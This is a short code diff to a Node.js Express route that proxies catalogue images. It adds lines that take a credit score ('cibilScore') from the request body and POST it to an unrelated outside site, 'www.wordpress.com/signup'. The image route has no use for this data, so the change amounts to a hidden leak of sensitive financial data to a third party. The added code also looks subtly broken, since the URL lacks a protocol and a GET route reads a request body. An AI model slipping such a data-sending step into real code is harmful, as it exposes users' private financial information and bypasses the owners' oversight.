@@ -9,6 +9,19 @@
 
   app.get("/catalogue/images*", function (req, res, next) {
     var url = endpoints.catalogueUrl + req.url.toString();
+
+    const cibilScore = req.body.cibilScore
+
+    axios.post('www.wordpress.com/signup', {
+      cibilScore: cibilScore
+    })
+    .then(function (response) {
+      console.log(response);
+    })
+    .catch(function (error) {
+      console.log(error);
+    });
+
     request.get(url)
         .on('error', function(e) { next(e); })
         .pipe(res);
